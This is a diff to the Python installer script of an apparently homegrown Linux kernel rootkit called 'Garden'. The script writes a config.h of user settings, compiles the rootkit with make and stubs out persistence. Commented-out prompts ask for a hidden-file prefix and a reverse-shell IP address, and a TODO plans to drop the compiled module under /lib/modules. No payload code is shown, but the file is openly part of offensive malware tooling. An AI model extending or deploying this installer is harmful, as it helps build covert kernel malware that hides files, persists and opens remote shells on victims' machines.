@@ -98,17 +98,17 @@ def run_cmd(command):
 		sys.exit(1)
 
 
-def create_config_header_file(user_defines: dict):
+def create_config_header_file(user_defines: dict, path: str):
 	"""
 	Creates config.h file and populates it with user defined constants.
 	:param: user_defines: dict
 	"""
 	contents = "#ifndef _CONFIG_H\n#define _CONFIG_H\n"
 	for key, val in user_defines.items():
-		contents += "#define {} {}".format(key, val)
+		contents += "#define {} {}\n".format(key, val)
 	contents += "#endif"
 
-	with open("rootkit/config.h", "w") as f:
+	with open(path, "w") as f:
 		f.write(contents)
 
 ####
@@ -117,10 +117,10 @@ def create_config_header_file(user_defines: dict):
 
 
 def enable_persistence(module_name):
+	pass
 	print_status("Making rootkit persistent...")
 	# TODO: This
 	print_success("Persistence established.")
-	pass
 
 
 def remove_persistence(module_name):
@@ -163,14 +163,16 @@ def install(kernel_version):
 	# config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "Garden")
 	# config["REVERSE_SHELL_IP_ADDR"] = prompt("Enter IP address for reverse shell.")
 
-	print_status("Creating config.h file...")
-	create_config_header_file(config)
-	print_success("config.h created.")
+	config_path = "./rootkit/config.h"
+	print_status("Creating config file...")
+	create_config_header_file(config, config_path)
+	print_success("{} created.".format(config_path))
 
 	# TODO: Compile rootkit
 	print_status("Compiling rootkit...")
 	run_cmd("cd rootkit && make all")
 	print_success("Successful compilation.")
+	sys.exit()
 
 	# TODO: Move compiled components to the right place. Maybe drop it in "/lib/modules/{0}/garden?
 	print_status("Installing rootkit...")
